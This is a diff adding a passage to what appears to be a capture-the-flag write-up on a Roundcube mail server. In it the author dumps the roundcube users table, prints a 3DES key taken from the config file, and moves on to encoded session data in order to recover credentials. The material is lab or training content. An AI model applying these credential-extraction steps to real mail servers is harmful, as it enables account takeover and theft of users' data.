@@ -187,3 +187,37 @@ MariaDB [roundcube]> show tables;
 +---------------------+
 17 rows in set (0.001 sec)
 ```
+
+Lets dump the data of `users` table and see if we find anythinf useful
+
+```mysql
+SELECT * FROM users;
+```
+
+Output
+
+```mysql
+MariaDB [roundcube]> SELECT * FROM users;
++---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+-----------------------------------------------------------+
+| user_id | username | mail_host | created             | last_login          | failed_login        | failed_login_counter | language | preferences                                               |
++---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+-----------------------------------------------------------+
+|       1 | jacob    | localhost | 2025-06-07 13:55:18 | 2025-07-26 22:33:24 | 2025-07-27 04:31:36 |                    1 | en_US    | a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";}         |
+|       2 | mel      | localhost | 2025-06-08 12:04:51 | 2025-06-08 13:29:05 | NULL                |                 NULL | en_US    | a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";}         |
+|       3 | tyler    | localhost | 2025-06-08 13:28:55 | 2025-07-27 04:21:15 | 2025-06-11 07:51:22 |                    1 | en_US    | a:2:{s:11:"client_hash";s:16:"WssE42vCcbbLL2om";i:0;b:0;} |
++---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+-----------------------------------------------------------+
+3 rows in set (0.001 sec)
+
+```
+
+We find 3 users...hmm but there are no valid hashes but in the roundcube config file we found something interesting
+
+```3des key
+rcmail-!24ByteDESkey*Str
+```
+The hashes are stored as 3DES hash we can try to decode it but we dont have a valid client hash
+
+After further enumeration i found sessions table where we have sessions encoded in base64 format
+
+```mysql
+SELECT * FROM session;
+```
